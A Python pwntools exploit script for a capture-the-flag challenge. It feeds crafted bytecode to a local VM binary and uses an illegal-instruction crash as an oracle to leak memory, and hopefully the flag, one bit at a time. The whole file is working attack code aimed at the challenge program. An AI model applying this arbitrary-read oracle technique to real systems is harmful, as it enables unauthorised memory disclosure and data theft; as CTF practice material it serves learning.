#!/usr/bin/env python3
"""
Final exploit attempt: Bit-by-bit flag exfiltration

Since we have a working oracle and no obvious RCE path, let's think:
1. The flag might be loaded by the server wrapper somehow
2. We can read ANY address in the VM's 32-bit address space
3. Maybe the flag is placed at a known address?

Common CTF patterns:
- Flag at address 0
- Flag at a specific magic address  
- Flag in a file (but no file I/O here)
- Flag passed via environment (need libc leak)

Let me try reading from address 0 to see if there's something besides our code:
Since code is loaded at a user-specified address, the flag might be elsewhere!
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_bit_test_at_addr(code_addr, read_addr, bit_position, expected_bit):
    """Create code loaded at code_addr that tests bit at read_addr."""
    code = b''
    code += mov_reg_imm(15, read_addr)
    code += pop_reg(0)
    
    shl_amount = 31 - bit_position
    if shl_amount > 0:
        code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    current = code_addr + len(code)
    hlt_offset = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_bit_at_addr(code_addr, read_addr, bit_position, expected_bit=1):
    """Load code at code_addr and test bit at read_addr."""
    code = create_bit_test_at_addr(code_addr, read_addr, bit_position, expected_bit)
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(str(code_addr).encode())
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(str(code_addr).encode())
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_byte_at_addr(code_addr, read_addr):
    """Leak a byte at read_addr using code at code_addr."""
    val = 0
    for bit in range(8):
        if test_bit_at_addr(code_addr, read_addr, bit, 1):
            val |= (1 << bit)
    return val

def main():
    print("[*] Flag Exfiltration Attempt")
    print("[*] ==========================")
    
    # Load code at address 0x10000, read from address 0
    code_addr = 0x10000
    
    print(f"[*] Loading code at 0x{code_addr:x}")
    print("[*] Reading bytes from address 0x0...")
    
    # Try reading first 64 bytes from address 0
    # If there's a flag there, it should be printable ASCII
    data = b''
    for i in range(64):
        byte = leak_byte_at_addr(code_addr, i)
        data += bytes([byte])
        if byte == 0:
            print(f"\n[*] Hit null at offset {i}")
            break
        sys.stdout.write(f"\r[*] Byte {i}: 0x{byte:02x} '{chr(byte) if 32 <= byte < 127 else '?'}'")
        sys.stdout.flush()
    
    print(f"\n\n[*] Data: {data}")
    print(f"[*] Hex: {data.hex()}")
    print(f"[*] ASCII: {data.decode('latin-1')}")
    
    # Check if it looks like a flag
    if b'flag' in data.lower() or b'hkcert' in data.lower() or b'{' in data:
        print("[+] Potential flag found!")
    else:
        print("[-] No obvious flag pattern")

if __name__ == '__main__':
    main()
